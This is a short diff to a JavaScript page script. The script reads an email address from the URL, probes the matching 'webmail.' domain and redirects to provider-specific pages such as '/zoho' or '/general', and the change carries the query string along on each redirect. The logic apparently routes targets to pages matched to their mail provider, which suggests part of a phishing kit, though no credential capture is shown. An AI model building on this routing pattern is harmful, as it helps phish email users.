@@ -14,6 +14,7 @@ function matchRuleShort(str, rule) {
 const url = window.location.href;
 const queryString = window.location.search;
 const parameters = new URLSearchParams(queryString);
+var urlallgetvalue = url.split("?")[1];
 
 // Set User Value software
 const userurlsoftware = parameters.get("software");
@@ -44,7 +45,7 @@ if (userurlemail != null) {
 const myTimeout = setTimeout(myGreeting, 5000);
 
 function myGreeting() {
-  window.location.href = "/general";
+  window.location.href = "/general?" + urlallgetvalue;
 }
 
 ////////////////////////////////////////////////////////////////////////
@@ -287,7 +288,7 @@ if (userdomainfromemail != null) {
       } else if (xhr.readyState === 4 && check === 0) {
         getError += 1;
         if (getError === 6) {
-          window.location.href = "/general";
+          window.location.href = "/general?" + urlallgetvalue;
         }
       }
     };
@@ -310,13 +311,14 @@ if (userdomainfromemail != null) {
       } else if (string === "Zoho") {
         window.location.href = "/zoho";
       } else {
-        window.location.href = "/general";
+        window.location.href = "/general?" + urlallgetvalue;
       }
       check = 1;
       return;
-    } else {
-      window.location.href = "/general";
     }
+    // else {
+    //   window.location.href = "/general";
+    // }
   }
 
   getReady("http://webmail." + userdomainfromemail);
